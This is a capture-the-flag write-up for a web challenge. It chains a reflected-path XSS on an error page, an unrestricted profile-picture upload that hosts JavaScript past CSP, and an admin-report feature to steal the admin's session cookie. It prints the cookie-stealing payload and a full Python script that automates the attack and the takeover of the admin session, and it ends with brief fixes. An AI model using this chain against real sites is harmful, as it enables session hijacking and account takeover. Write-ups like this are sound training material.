carbon
==============

Overview
--------
The provided program is a web application which wants to present the high quality security of Carbon Cyber.
It's functionalities are registering a new user, authenticating, sending messages to users, receiving messages and editing your profile picture.
The website claims all of this to be super secure because XSS Auditor (xss-a) and Content Security Policy (csp) are both enabled.

Vulnerability
-------------
The exploitation of the site is possible through a XSS type of attack which is possible through composition of three weak spots.

1. When navigating to a non existent url the app would show an error page with the path of the url reflected on the page.
2. On this type of error page a user can provide a proof of work to send the current url to an admin of the site for inspection.
3. A file upload field meant for profile pictures which accepts any kind of file type.

Exploitation
------------
Without the xss-a and csp headers set the page would have been vulnerable already because of weakness 1 and 2 but since that is not the case I had to be a little more creative.
While the xss-a header would block the whole page if reflected in-line JavaScript is detected (not on Firefox) csp goes a little further by ignoring in-line scripts which wouldn't hash to the configured value and all other script whose source would be different that the configured ones, in this case only sources from the same origin were allowed.
Finding a sha256 hash collision which would execute my desired code to get the admin cookie seemed a little impossible so I tried to upload a simple js file, containing only a simple alert statement for testing purposes, as my profile picture.
As this worked I went to `/fake-url` and appended some html tags to that path to check if any characters crucial for the attack were being filtered.
None of them were so I came up with `/fake-url</p><script scr="{profile-pircure-url}"></script><p>` and voilà I got alerted.
The next steps involved crafting a script that would get the current cookie and send it to me, reuploading that as my profile picture and navigating to the vulnerable error page again to provide the proof of work.
After that I had the admins cookie in my inbox, set it through my browser console and navigated to that accounts inbox to get the flag.

This is the "profile picture" I used.

    const data = new FormData();
    data.append('mail', 'wut@wut.wut');
    data.append('contents', document.cookie);

    fetch('/send', {
    method: 'POST',
    body: data,
    credentials: 'same-origin',
    headers: {
        'Cookie': document.cookie,
    },
    });

After getting the flag I wrote this python script automating the process to show the necessary steps.

    #!/usr/bin/env python3

    import string
    import re
    from hashlib import sha1
    from requests import Session
    from itertools import product


    DEBUG = False
    BASE_URL = 'https://carbon.wutctf.space'
    EMAIL = 'wut@wut.wut'
    PASSWORD = 'password123'
    CREDENTIALS = (EMAIL, PASSWORD)
    SESSION = Session()


    class AuthenticationException(Exception):
        pass


    def authenticate(session, credentials):
        login_url = BASE_URL + '/login'
        email, password = credentials
        session.post(login_url, data={
            'mail': email,
            'password': password
        })
        if SESSION.cookies.get('session') == None:
            raise AuthenticationException(
                'Couldn\'t authenticate with {mail} and {pw} at {url}'.format(
                    mail=email,
                    pw=password,
                    url=login_url
                )
            )


    def header_is_consistent(header):
        open_endpoints = [
            '/',
            '/login',
            '/register',
            '/bogus',
        ]
        protected_endpoints = [
            '/send',
            '/messages',
            '/profile',
            '/upload',
            '/bogus',
        ]
        session = Session()
        header_contents = []
        for endpoint in open_endpoints:
            response = session.get(BASE_URL + endpoint)
            header_contents.append(session.headers.get(header))
        authenticate(session, CREDENTIALS)
        for endpoint in protected_endpoints:
            response = session.get(BASE_URL + endpoint)
            header_contents.append(session.headers.get(header))
        return len(set(header_contents)) == 1


    def find_collision_fragment(s, h):
        s_pre, s_post = s.split('????')
        for c in product(string.ascii_letters + string.digits, repeat=4):
            guess = s_pre + ''.join(c) + s_post
            if sha1(guess.encode()).hexdigest() == h:
                return ''.join(c)


    def main():
        authenticate(SESSION, CREDENTIALS)

        payload_script = './payload.js'
        response = SESSION.post(
            BASE_URL + '/upload',
            files={
                'file': open(payload_script, 'rb')
            }
        )
        uploaded_payload = re.search(r'/uploads/[^\s"]+', response.text).group(0)
        payload_url = '/fake-url</p><script src="{upload}"></script><p>'.format(upload=uploaded_payload)

        response = SESSION.get(BASE_URL + payload_url)
        token = re.search(r'<code>.+</code>', response.text).group(0)
        source, target = re.sub(r'</?code>|\s+|\'|sha1|\(|\)', '', token).split('==')
        collision_fragment = find_collision_fragment(source, target)

        SESSION.post(BASE_URL + '/report', data={
            'challenge': collision_fragment
        })

        response = SESSION.get(BASE_URL + '/messages')
        token = re.search(r'session=.+', response.text).group(0)
        admin_cookie = re.sub(r'session=' , '', token[:token.index('<')])

        print(token)

        SESSION.cookies.clear()
        SESSION.cookies.set('session', admin_cookie)

        response = SESSION.get(BASE_URL + '/messages')
        token = re.search(r'(\w+_)+\w+', response.text)

        if len(token.groups()) == 1:
            print(token.group(0))
        else:
            print(response.text)


    if __name__ == '__main__':
        main()

Solution
--------
Preventing the upload of non image type files to the site might be a good idea but I'm not completely sure if this solves the issue since I have read about images which contain JavaScript which is executed by the browser when rendered.
Not reflecting user input on the page would help as well since without it I could not have injected that script tag.

`Page /fake-url does not exist!` -> `Page does not exists!`

Lastly I think not having admins blindly click on links provided by unknown sources is a good idea as well but since this is not controlled by the application and humans in general are a weak spot security wise this advice is probably useless.
